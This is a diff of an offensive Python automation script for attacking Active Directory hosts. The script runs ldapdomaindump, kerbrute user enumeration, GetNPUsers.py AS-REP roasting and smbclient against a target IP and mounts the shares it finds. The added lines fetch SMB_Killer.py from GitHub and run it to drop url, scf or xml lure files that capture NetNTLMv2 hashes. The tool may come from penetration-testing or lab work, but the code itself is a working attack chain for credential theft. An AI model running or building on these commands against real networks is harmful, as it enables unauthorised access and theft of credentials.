@@ -292,10 +292,11 @@ if search_word in open(domainip+"-rustscan.txt").read():
 	if (len(username) == 0) and (len(password) == 0 ):
 		ret_code=system("ls LDAP")
 		if ret_code != 0:
-			os.makedirs("LDAP")
+			system("mkdir LDAP")
 		os.chdir("LDAP")
 		system("ldapdomaindump "+domainip+"")
-	system("cd ..")
+		print("\033[1;31m Tried anonymous ldapdomaindump and put in LDAP folder\033[1;39m\n")
+		system("cd ..")
 	if (len(username) != 0) and (len(password) == 0):
 		userin = input("Is that a username or userfile? (u/uf):\n")
 		if userin == "u":
@@ -310,6 +311,9 @@ if search_word in open(domainip+"-rustscan.txt").read():
 		print("\033[1;31m Making directory LDAP and doing LDAP domain dump\033[1;39m\n")
 		sys = ""+domain+"/"+username+":"+password+" -dc-ip "+domainip+""
 		print("ldapdomaindump trying on "+domainip+" in domain "+domain+" with user "+username+" and password "+password+"")
+		system("mkdir LDAP")
+		os.chdir("LDAP")
+		print("\033[1;31m Tried ldapdomaindump and put in LDAP folder\033[1;39m\n")
 		system("ldapdomaindump "+domainip+" -u "'"'+domain+'\\'+username+'"'" -p "+password+"")
 		print("")
 		print("\033[1;35m Opening firefox for ldapdomaindump, make sure to look at all pages\033[1;39m\n")
@@ -325,18 +329,37 @@ if search_word in open(domainip+"-rustscan.txt").read():
 		threads = input("How many threads would you like to run, higher is faster?")
 		system(ker+" userenum -d "+domain+" --dc "+domainip+" "+username+" -t "+threads+"")
 		system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userin+" -dc-ip "+domainip+"")
-search_word = "445"
-if search_word in open(domainip+"-rustscan.txt").read():
-	print("\033[1;31m Testing anonymous login\033[1;39m\n")
-	system("smbclient -L \\\\"+domainip+"\\")
-	if (len(username) != 0) and (len(password) !=0):
-		print("\033[1;35m Testing login with "+username+" and "+password+"\033[1;39m\n")
-		system("smbclient -L \\\\\\\\"+domainip+"\\\\ -U "+domain+"/"+username+"%"+password+"")
-		share = input("\033[1;31m Any shares you would like to look at (ex: usershare) if no press enter to continue?\033[1;39m\n")
-		if share != 0:
-			system("mkdir tmp")
-			system("sudo mount -t cifs //"+domainip+"/"+share+" -o user="+username+" tmp")
-			
+
+print("\033[1;31m Testing anonymous login\033[1;39m\n")
+system("smbclient -L \\\\"+domainip+"\\")
+if (len(username) != 0) and (len(password) !=0):
+	print("\033[1;35m Testing login with "+username+" and "+password+"\033[1;39m\n")
+	system("smbclient -L \\\\\\\\"+domainip+"\\\\ -U "+domain+"/"+username+"%"+password+"")
+	share = input("\033[1;31m Any shares you would like to look at (ex: usershare) if no press enter to continue?\033[1;39m\n")
+	if share != 0:
+		system("mkdir tmp")
+		print("\033[1;31m Mounting SMB Share into tmp folder\033[1;39m\n")
+		system("sudo mount -t cifs //"+domainip+"/"+share+" -o user="+username+" tmp")
+		smbkiller = input("Do you want to download SMB_Killer.py and try to get NetNTLMv2 hash? (y/n)\n")
+		if smbkiller == "y":
+			print("\033[1;31m Downloading newest version of smbkiller from github\033[1;39m")
+			url = "https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.py"
+			input("\033[1;32m File is downloaded, opening with nano, change the information on the top that is needed to be changed. Press enter to continue.\033[1;39m")
+			file = "SMB_Killer.py"
+			urllib.request.urlretrieve(url, file)
+			system("nano SMB_Killer.py")
+			ftype = input("\033[1;31m What file would you like to make, url, scf or xml? (ex: url)\033[1;39m\n")
+			if ftype == "url":
+				system("python3 SMB_Killer.py -u")
+			elif ftype == "scf":
+				system("python3 SMB_Killer.py -s")
+			elif ftype == "xml":
+				system("python3 SMB_Killer.py -x")
+			else:
+				print("Not an option")
+		else:
+			"Not running smbkiller"
+		
 if args.scan == True:
 	scan()
 if args.SMBKiller == True:
